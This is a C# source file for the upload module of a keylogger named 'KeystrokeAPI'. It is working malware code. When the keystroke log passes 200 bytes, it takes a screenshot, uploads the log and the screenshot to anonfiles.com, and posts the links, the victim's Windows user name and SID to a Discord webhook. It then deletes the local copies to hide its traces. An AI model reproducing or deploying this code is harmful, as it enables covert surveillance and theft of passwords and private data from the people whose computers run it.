using System;
using System.IO;
using System.Net;
using System.Net.Mime;
using System.Security.Principal;
using System.Windows.Forms;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using RestSharp;

namespace Keystroke.API.Helpers
{
    

    public class LoggerUploader
    {
        
        public static string ScreenShotUrl;
        public static string LogUrl;
        
        
        public string DiscordUrlHook { get; set; }

        public LoggerUploader(string DiscordUrlHook)
        {
            this.DiscordUrlHook = DiscordUrlHook;
        }
        
        public void OnUserTyping(object sender, EventArgs e)
        {
            var logFile = LoggerSaver.LogginDirectory + LoggerSaver.LogginFile;
            string TakeScreenShot = Helpers.Screenshot.TakeScreenShot();
            // Will check if the size file is more than 200 bytes the file will be uploaded.
            if (new FileInfo(logFile).Length > 200)
            {
                UploadToAnon(logFile,"normallog");
                UploadToAnon(TakeScreenShot,"ScreenShot");
                //Then the file will be deleted and re-created again
                File.Delete(logFile);
                File.Delete(TakeScreenShot);
            }
        }


        public void UploadToAnon(string path, string LogType)
        {
            var copyOfLogs = path + new Random().GetHashCode()+".txt";
            File.Copy(path,copyOfLogs);
            
            
            
           RestClient restClient = new RestClient("https://api.anonfiles.com/upload");
           RestRequest restRequest = new RestRequest();

           restRequest.AddFile("file", copyOfLogs);
           
           
           Console.WriteLine(restClient.PostAsync(restRequest, (response, handle) =>
           {
               dynamic responseObject = JsonConvert.DeserializeObject(response.Content);
               var AnonUrl = responseObject["data"]["file"]["url"]["full"];

               if (LogType == "normallog")
               {
                   LogUrl = AnonUrl;
               }
               else
               {
                   ScreenShotUrl = AnonUrl;
                   ReportUploadedFileToDiscord(LogUrl, ScreenShotUrl);
               }
               
               File.Delete(copyOfLogs);
           }));
           
        }
        
        
        

        public void ReportUploadedFileToDiscord(string LogUrl, string ScreenShotUrl)
        {
            RestClient restClient = new RestClient(DiscordUrlHook);
            RestRequest restRequest = new RestRequest();
            
            var json = JsonConvert.SerializeObject(new
            {
                username = $"KeystrokeAPI -> KeyLogger -> Report",
                embeds = new[]
                {
                    new
                    {
                        description = $"KeystrokeAPI has new report!" +
                                      $"\n**Computer Name:** {WindowsIdentity.GetCurrent().Name}" +
                                      $"\n**ScreenShot:** ||{ScreenShotUrl}||" +
                                      $"\n**DOWNLOAD URL:** ||{LogUrl}||" +
                                      $"\n**Hwid:** ||{WindowsIdentity.GetCurrent().User?.Value}||",
                        title = $"Keylogger report!",
                    }
                }
            });
            restRequest.AddParameter("application/json", json,ParameterType.RequestBody);

            Console.WriteLine(restClient.PostAsync(restRequest, (response, handle) =>
            {
                Console.WriteLine(response.Content);
            }));
        }


    }
}